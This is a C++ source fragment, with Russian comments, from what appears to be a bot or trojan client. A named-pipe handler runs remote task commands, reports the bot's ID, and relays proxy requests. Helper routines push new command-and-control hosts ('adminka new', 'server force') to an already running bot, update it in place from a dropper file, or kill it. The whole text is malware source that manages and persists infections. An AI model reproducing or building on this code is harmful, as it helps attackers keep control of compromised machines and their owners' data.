GeneralPipeServer::GeneralPipeServer()
{
	MakeNameGeneralPipe(name);
}

GeneralPipeServer::~GeneralPipeServer()
{
}

int GeneralPipeServer::Handler( Pipe::Msg* msgIn, void** msgOut )
{
	int ret = 0;
	switch( msgIn->cmd )
	{
		case CmdTask:
			ManagerServer::CmdExec( (char*)msgIn->data, msgIn->sz_data );
			break;
		case CmdInfo:
			info.pidMain = Process::CurrentPID();
			info.pidServer = 0;
			Str::Copy( info.uid, sizeof(info.uid), Config::UID );
			GetEnvironmentComment( info.comment, sizeof(info.comment) );
			*msgOut = &info;
			ret = sizeof(info);
			break;
		case CmdGetProxy:
			PipeClient pipe(Config::nameManager);
			pipe.Request( ManagerServer::CmdGetProxy, msgIn->data, msgIn->sz_data, result );
			*msgOut = result.Ptr();
			ret = result.Len();
			break;
	}
	return ret;
}

static const char* GetValVer( const char* s, int& v )
{
	v = 0;
	while( *s >= '0' && *s <= '9' ) v = v * 10 + *s++ - '0';
	return ++s;
}

static int GetVerRunnedBot( PipeClient& pc )
{
	int ver = 0;
	Mem::Data data;
	if( pc.Request( GeneralPipeServer::CmdInfo, 0, 0, data ) )
	{
		GeneralPipeServer::InfoBot* info = (GeneralPipeServer::InfoBot*)data.Ptr();
		int p1 = Str::IndexOf( info->comment, _CS_("Ver: ") );
		if( p1 > 0 )
		{
			p1 += 5;
			int v1, v2, v3;
			const char* p2 = GetValVer( info->comment + p1, v1 );
			p2 = GetValVer( p2, v2 );
			p2 = GetValVer( p2, v3 );
			ver = v1 * 10000 + v2 * 100 + v3;
		}
	}
	return ver;
}

//обновляет хосты 
static bool UpdateHosts( PipeClient& pc )
{
	DbgMsg( "Обновляем хосты в работаещем боте" );
	StringBuilder hosts, cmd;
	bool ret = false;
	if(	AdminPanel::GetHosts( AdminPanel::DEF, hosts ) )
	{
		if( hosts.Len() > 5 )
		{
			cmd = _CS_("adminka new ");
			cmd += hosts;
			if( pc.Send( GeneralPipeServer::CmdTask, cmd.c_str(), cmd.Len() ) ) ret = true;
		}
	}
	if( VideoServer::GetHosts(hosts) )
	{
		if( hosts.Len() > 5 )
		{
			cmd = _CS_("server force " );
			hosts.ReplaceChar( '|', ' ' );
			cmd += hosts;
			if( pc.Send( GeneralPipeServer::CmdTask, cmd.c_str(), cmd.Len() ) ) ret = true;
		}
	}
	return ret;
}

//обновление тела
static bool UpdateBot( PipeClient& pc, const char* dropper )
{
	DbgMsg( "Обновляем бота локально файлом %s", dropper );
	if( *dropper == 0 ) return false;
	StringBuilder cmd(MAX_PATH);
	cmd += _CS_("update ");
	cmd += dropper;
	if( pc.Send( GeneralPipeServer::CmdTask, cmd.c_str(), cmd.Len() ) )
	{
		Delay(5000);
		return true;
	}
	return false;
}

static bool KillBot( PipeClient& pc )
{
	DbgMsg( "Уничтожаем работающего бота" );
	return pc.Send( GeneralPipeServer::CmdTask, _CS_("killbot"), 7 );
}

bool UpdateIsDublication( const char* dropper )
{
	DbgMsg("Обновляем уже запущенного бота");
	//пытаемся получить инфу у запущенного бота
	StringBuilderStack<64> nameGenaralPipe;
	MakeNameGeneralPipe(nameGenaralPipe);
	PipeClient pc(nameGenaralPipe);
	int ver = GetVerRunnedBot(pc);
	DbgMsg( "Версия работающего бота %d, сейчас запущенного %d", ver, Config::BotVersionInt );
	bool ret = false;
	if( ver <= Config::BotVersionInt )
	{
		if( ver < 10203 ) //версия с которой есть поддержка локального обновления
		{
			if( !KillBot(pc) )
				ret = UpdateHosts(pc);
		}
		else
			if( UpdateBot( pc, dropper ) )
				ret = true;
			else
				ret = UpdateHosts(pc);
	}
	else
		ret = UpdateHosts(pc);
	return ret;
}
